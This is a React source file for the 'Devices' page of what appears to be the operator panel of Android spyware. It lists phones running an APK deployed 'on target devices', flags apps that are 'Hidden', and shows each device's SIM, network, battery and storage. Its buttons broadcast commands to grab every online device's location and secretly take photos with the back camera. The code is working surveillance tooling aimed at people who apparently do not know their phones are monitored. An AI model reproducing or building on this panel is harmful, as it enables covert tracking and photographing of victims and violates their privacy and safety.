import React, { useState, useEffect, useCallback } from 'react';
import { devicesAPI, commandsAPI } from '../services/api';
import { Link } from 'react-router-dom';
import { toast } from 'react-toastify';
import {
  FiSmartphone,
  FiSearch,
  FiFilter,
  FiMapPin,
  FiCamera,
  FiTrash2,
  FiChevronRight,
} from 'react-icons/fi';
import LoadingSpinner from '../components/LoadingSpinner';
import EmptyState from '../components/EmptyState';

const ANDROID_VERSION_MAP = {
  29: '10', 30: '11', 31: '12', 32: '12L',
  33: '13', 34: '14', 35: '15', 36: '16',
};

function getAndroidLabel(version) {
  return ANDROID_VERSION_MAP[version] || version || 'N/A';
}

export default function Devices() {
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [search, setSearch] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [actionLoading, setActionLoading] = useState(null);

  const loadDevices = useCallback(async () => {
    try {
      const params = {};
      if (statusFilter !== 'all') params.status = statusFilter;
      if (search) params.search = search;
      const res = await devicesAPI.getAll(params);
      if (res.data?.success) {
        setDevices(res.data.devices || []);
        setError(null);
      }
    } catch (err) {
      const message = err.response?.data?.message || 'Failed to load devices';
      setError(message);
      toast.error(message);
    } finally {
      setLoading(false);
    }
  }, [search, statusFilter]);

  useEffect(() => {
    loadDevices();
    const interval = setInterval(loadDevices, 10000);
    return () => clearInterval(interval);
  }, [loadDevices]);

  const handleBroadcast = async (type) => {
    if (!window.confirm(`Send "${type}" command to ALL online devices?`)) return;
    setActionLoading(`broadcast-${type}`);
    try {
      await commandsAPI.broadcast(type);
      toast.success(`Command "${type}" sent to all online devices`);
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to broadcast command');
    } finally {
      setActionLoading(null);
    }
  };

  const handleDelete = async (deviceId) => {
    if (!window.confirm(`Delete device ${deviceId.substring(0, 16)}... and ALL its data? This cannot be undone.`)) return;
    setActionLoading(`delete-${deviceId}`);
    try {
      await devicesAPI.delete(deviceId);
      toast.success('Device deleted');
      loadDevices();
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to delete device');
    } finally {
      setActionLoading(null);
    }
  };

  const filteredDevices = devices.filter((d) => {
    if (!search) return true;
    const s = search.toLowerCase();
    return (
      d.deviceName?.toLowerCase().includes(s) ||
      d.deviceId?.toLowerCase().includes(s) ||
      d.manufacturer?.toLowerCase().includes(s) ||
      d.model?.toLowerCase().includes(s)
    );
  });

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <h1 className="text-2xl font-bold text-white">Devices</h1>
        <div className="flex gap-2">
          <button
            onClick={() => handleBroadcast('get_location')}
            disabled={actionLoading === 'broadcast-get_location'}
            className="btn-secondary text-sm flex items-center gap-2"
          >
            <FiMapPin />{actionLoading === 'broadcast-get_location' ? 'Sending...' : 'Get All Locations'}
          </button>
          <button
            onClick={() => handleBroadcast('capture_photo_back')}
            disabled={actionLoading === 'broadcast-capture_photo_back'}
            className="btn-secondary text-sm flex items-center gap-2"
          >
            <FiCamera />{actionLoading === 'broadcast-capture_photo_back' ? 'Capturing...' : 'Capture All'}
          </button>
        </div>
      </div>

      {/* Error Banner */}
      {error && (
        <div className="bg-red-900/30 border border-red-700/50 text-red-400 px-5 py-3 rounded-xl text-sm flex items-center gap-3">
          <FiTrash2 className="text-lg flex-shrink-0" />
          <span>{error}</span>
          <button onClick={loadDevices} className="ml-auto underline hover:no-underline">Retry</button>
        </div>
      )}

      {/* Filters */}
      <div className="flex flex-col sm:flex-row gap-3">
        <div className="relative max-w-xs w-full">
          <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
          <input
            type="text"
            placeholder="Search devices..."
            className="input-field pl-10"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
        </div>
        <div className="relative max-w-[150px] w-full">
          <FiFilter className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 z-10" />
          <select
            className="input-field pl-10"
            value={statusFilter}
            onChange={(e) => setStatusFilter(e.target.value)}
          >
            <option value="all">All Status</option>
            <option value="online">Online</option>
            <option value="offline">Offline</option>
          </select>
        </div>
        <span className="text-sm text-gray-500 self-center">
          {filteredDevices.length} device{filteredDevices.length !== 1 ? 's' : ''}
        </span>
      </div>

      {/* Device List */}
      {loading ? (
        <LoadingSpinner />
      ) : filteredDevices.length === 0 ? (
        <EmptyState
          icon={FiSmartphone}
          title={search ? 'No devices match your search' : 'No devices found'}
          description={search ? 'Try a different search term' : 'Build an APK and deploy it on target devices'}
        />
      ) : (
        <div className="grid gap-4">
          {filteredDevices.map((device) => (
            <div key={device.deviceId} className="card p-5 hover:border-primary-600/30 transition-colors">
              <div className="flex items-start justify-between flex-wrap gap-4">
                <div className="flex items-start gap-4">
                  <div className="w-12 h-12 bg-dark-700 rounded-xl flex items-center justify-center text-xl text-gray-400">
                    <FiSmartphone />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h3 className="text-white font-semibold">
                        {device.deviceName || 'Unknown Device'}
                      </h3>
                      {device.isOnline && (
                        <span className="online-dot inline-block w-2 h-2 bg-green-400 rounded-full"></span>
                      )}
                    </div>
                    <p className="text-sm text-gray-400">
                      {device.manufacturer} {device.model}
                    </p>
                    <div className="flex items-center gap-3 mt-1 text-xs text-gray-500">
                      <span>Android {getAndroidLabel(device.sdkVersion)}</span>
                      <span>•</span>
                      <span>ID: {device.deviceId?.substring(0, 16)}...</span>
                      <span>•</span>
                      <span>Battery: {device.batteryLevel}%{device.isCharging ? ' ⚡' : ''}</span>
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <span className={device.isOnline ? 'badge-success' : 'badge-danger'}>
                    {device.isOnline ? 'Online' : 'Offline'}
                  </span>
                  {device.isHidden && <span className="badge-warning">Hidden</span>}
                  <Link
                    to={`/devices/${device.deviceId}`}
                    className="btn-primary text-xs py-1.5 px-3 flex items-center gap-1"
                  >
                    Manage <FiChevronRight />
                  </Link>
                  <button
                    onClick={() => handleDelete(device.deviceId)}
                    disabled={actionLoading === `delete-${device.deviceId}`}
                    className="btn-danger text-xs py-1.5 px-3 flex items-center gap-1"
                  >
                    <FiTrash2 className="text-sm" />
                    {actionLoading === `delete-${device.deviceId}` ? '...' : 'Delete'}
                  </button>
                </div>
              </div>

              {/* Quick info */}
              <div className="mt-3 grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
                <div className="bg-dark-700/50 rounded-lg p-2">
                  <span className="text-gray-500">SIM:</span>{' '}
                  <span className="text-gray-300">{device.simInfo || 'N/A'}</span>
                </div>
                <div className="bg-dark-700/50 rounded-lg p-2">
                  <span className="text-gray-500">Network:</span>{' '}
                  <span className="text-gray-300">{device.networkType || 'N/A'}</span>
                </div>
                <div className="bg-dark-700/50 rounded-lg p-2">
                  <span className="text-gray-500">Storage:</span>{' '}
                  <span className="text-gray-300">{device.usedStorage || '?'}/{device.totalStorage || '?'}</span>
                </div>
                <div className="bg-dark-700/50 rounded-lg p-2">
                  <span className="text-gray-500">Last Seen:</span>{' '}
                  <span className="text-gray-300">
                    {device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}
                  </span>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}